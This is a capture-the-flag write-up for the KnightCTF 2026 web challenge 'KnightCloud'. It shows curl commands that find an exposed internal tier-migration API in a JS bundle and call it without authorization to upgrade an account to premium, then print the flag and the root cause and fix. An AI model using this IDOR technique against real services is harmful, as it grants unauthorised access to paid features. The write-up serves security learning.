---
title: KnightCTF 2026 - KnightCloud (Web - 100pts)
date: 2026-01-26 17:00:00 +0800
categories: [KnightCTF2026, Web]
tags: [web, idor, broken-access-control, javascript, privilege-escalation]
description: 'KnightCloud SaaS premium bypass via exposed internal API and IDOR.'
toc: true
pin: false
image:
  path: https://ctftime.org/media/cache/eb/72/eb72f766ca7ff85a3d8fd5d10d756ab1.png
---

**Challenge**: KnightCloud (Web, 100pts)

**Goal**: Access premium analytics without payment.

**Hint**: Frontend "internal" exposure.

## Initial Recon

SPA at `http://23.239.26.112:8091`.

Download JS bundle:

```bash
curl http://23.239.26.112:8091/assets/index-*.js -o index.js
grep -i 'internal\|migrate\|premium' index.js
```

**Discovery**: Global `__KC_INTERNAL__.updateUserTier(uid, tier)` → POST `/api/internal/v1/migrate/user-tier`.

**Body**:
```json
{"u": "user-uid", "t": "premium"}
```

**Vuln**: Internal migration API client-accessible, no auth/role check.

**Type**: **IDOR / Broken Access Control**.

## User UID

Register:
```bash
curl -X POST http://23.239.26.112:8091/api/auth/register \
-H "Content-Type: application/json" \
-d '{"email":"test@test.com","password":"test123","fullName":"Test"}'
```

Login → Dashboard shows **UID**: `8a564c20-1c12-4122-97ac-4a41d5516472` (Free tier).

## Exploitation

Upgrade:
```bash
curl -X POST http://23.239.26.112:8091/api/internal/v1/migrate/user-tier \
-H "Content-Type: application/json" \
-d '{
  "u":"8a564c20-1c12-4122-97ac-4a41d5516472",
  "t":"premium"
}'
```

**Response**:
```json
{"success":true,"uid":"8a564c20-1c12-4122-97ac-4a41d5516472","tier":"premium"}
```

## Flag Retrieval

Premium endpoint:
```bash
curl http://23.239.26.112:8091/api/premium/analytics \
-H "Authorization: Bearer <YOUR_JWT>"
```

**Flag**: `KCTF{Pr1v1l3g3_3sc4l4t10n_1s_fun}`

## Attack Flow

```mermaid
graph LR
A[Register/Login] --> B[Extract UID from dashboard]
B --> C[POST /api/internal/v1/migrate/user-tier<br/>{u:UID, t:premium}]
C --> D[Premium tier granted]
D --> E[GET /api/premium/analytics → Flag]
```

## Root Cause

- Client-side internal API exposure
- No server authorization on UID/tier
- Trusting frontend-supplied identifiers

**Fix**: Server-side ownership check + API gating.

**Flag**: `KCTF{Pr1v1l3g3_3sc4l4t10n_1s_fun}`

**Preview**: /posts/CTF-International/KnightCTF2026/2026-03-15-knightcloud-writeup/

